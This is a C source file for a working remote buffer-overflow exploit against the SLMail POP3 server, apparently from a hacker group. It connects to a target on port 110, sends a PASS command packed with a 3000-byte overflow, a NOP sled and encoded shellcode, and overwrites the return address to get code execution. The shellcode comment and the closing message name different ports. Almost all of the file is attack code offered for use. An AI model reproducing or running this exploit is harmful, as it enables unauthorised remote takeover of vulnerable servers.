/*
SLMAIL REMOTE PASSWD BOF - Ivan Ivanovic Ivanov Иван-дурак
недействительный 31337 Team
*/

#include <string.h>
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

/*LPORT 5555*/
unsigned char shellcode[] = 
"\xdd\xc6\xd9\x74\x24\xf4\xb8\x49\x0b\x4c\xaa\x5b\x31\xc9\xb1"
"\x52\x31\x43\x17\x03\x43\x17\x83\x8a\x0f\xae\x5f\xf0\xf8\xac"
"\xa0\x08\xf9\xd0\x29\xed\xc8\xd0\x4e\x66\x7a\xe1\x05\x2a\x77"
"\x8a\x48\xde\x0c\xfe\x44\xd1\xa5\xb5\xb2\xdc\x36\xe5\x87\x7f"
"\xb5\xf4\xdb\x5f\x84\x36\x2e\x9e\xc1\x2b\xc3\xf2\x9a\x20\x76"
"\xe2\xaf\x7d\x4b\x89\xfc\x90\xcb\x6e\xb4\x93\xfa\x21\xce\xcd"
"\xdc\xc0\x03\x66\x55\xda\x40\x43\x2f\x51\xb2\x3f\xae\xb3\x8a"
"\xc0\x1d\xfa\x22\x33\x5f\x3b\x84\xac\x2a\x35\xf6\x51\x2d\x82"
"\x84\x8d\xb8\x10\x2e\x45\x1a\xfc\xce\x8a\xfd\x77\xdc\x67\x89"
"\xdf\xc1\x76\x5e\x54\xfd\xf3\x61\xba\x77\x47\x46\x1e\xd3\x13"
"\xe7\x07\xb9\xf2\x18\x57\x62\xaa\xbc\x1c\x8f\xbf\xcc\x7f\xd8"
"\x0c\xfd\x7f\x18\x1b\x76\x0c\x2a\x84\x2c\x9a\x06\x4d\xeb\x5d"
"\x68\x64\x4b\xf1\x97\x87\xac\xd8\x53\xd3\xfc\x72\x75\x5c\x97"
"\x82\x7a\x89\x38\xd2\xd4\x62\xf9\x82\x94\xd2\x91\xc8\x1a\x0c"
"\x81\xf3\xf0\x25\x28\x0e\x93\x43\xa6\x10\x46\x3c\xba\x10\x9d"
"\x0f\x33\xf6\xf7\x7f\x12\xa1\x6f\x19\x3f\x39\x11\xe6\x95\x44"
"\x11\x6c\x1a\xb9\xdc\x85\x57\xa9\x89\x65\x22\x93\x1c\x79\x98"
"\xbb\xc3\xe8\x47\x3b\x8d\x10\xd0\x6c\xda\xe7\x29\xf8\xf6\x5e"
"\x80\x1e\x0b\x06\xeb\x9a\xd0\xfb\xf2\x23\x94\x40\xd1\x33\x60"
"\x48\x5d\x67\x3c\x1f\x0b\xd1\xfa\xc9\xfd\x8b\x54\xa5\x57\x5b"
"\x20\x85\x67\x1d\x2d\xc0\x11\xc1\x9c\xbd\x67\xfe\x11\x2a\x60"
"\x87\x4f\xca\x8f\x52\xd4\xfa\xc5\xfe\x7d\x93\x83\x6b\x3c\xfe"
"\x33\x46\x03\x07\xb0\x62\xfc\xfc\xa8\x07\xf9\xb9\x6e\xf4\x73"
"\xd1\x1a\xfa\x20\xd2\x0e";


void exploit(int sock) {
      FILE *test;
      int *ptr;
      char userbuf[] = "USER madivan\r\n";
      char evil[3001];
      char buf[3012];
      char receive[1024];
      char nopsled[] = "\x90\x90\x90\x90\x90\x90\x90\x90"
                       "\x90\x90\x90\x90\x90\x90\x90\x90";
      memset(buf, 0x00, 3012);
      memset(evil, 0x00, 3001);
      memset(evil, 0x41, 3000);
      ptr = &evil;
      ptr = ptr + 652; // 2608 
      memcpy(ptr, &nopsled, 16);
      ptr = ptr + 4;
      memcpy(ptr, &shellcode, 351);
      *(long*)&evil[2606] = 0x5F4A358F; // \x8f\x35\x4a\x5f   5f4a358f  5F4A358F

      // banner
      recv(sock, receive, 200, 0);
      printf("[+] %s", receive);
      // user
      printf("[+] Sending Username...\n");
      send(sock, userbuf, strlen(userbuf), 0);
      recv(sock, receive, 200, 0);
      printf("[+] %s", receive);
      // passwd
      printf("[+] Sending Evil buffer...\n");
      sprintf(buf, "PASS %s\r\n", evil);
      //test = fopen("test.txt", "w");
      //fprintf(test, "%s", buf);
      //fclose(test);
      send(sock, buf, strlen(buf), 0);
      printf("[*] Done! Connect to the host on port 4444...\n\n");
}

int connect_target(char *host, u_short port)
{
    int sock = 0;
    struct hostent *hp;
    WSADATA wsa;
    struct sockaddr_in sa;

    WSAStartup(MAKEWORD(2,0), &wsa);
    memset(&sa, 0, sizeof(sa));

    hp = gethostbyname(host);
    if (hp == NULL) {
        printf("gethostbyname() error!\n"); exit(0);
    }
    printf("[+] Connecting to %s\n", host);
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    sa.sin_addr = **((struct in_addr **) hp->h_addr_list);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)      {
        printf("[-] socket blah?\n");
        exit(0);
        }
    if (connect(sock, (struct sockaddr *) &sa, sizeof(sa)) < 0)
        {printf("[-] connect() blah!\n");
        exit(0);
          }
    printf("[+] Connected to %s\n", host);
    return sock;
}


int main(int argc, char **argv)
{
    int sock = 0;
    int data, port;
    printf("\n[$] SLMail Server POP3 PASSWD Buffer Overflow exploit\n");
    printf("[$] by Mad Ivan [ void31337 team ] - http://exploit.void31337.ru\n\n");
    if ( argc < 2 ) { printf("usage: slmail-ex.exe <host> \n\n"); exit(0); }
    port = 110;
    sock = connect_target(argv[1], port);
    exploit(sock);
    closesocket(sock);
    return 0;
}
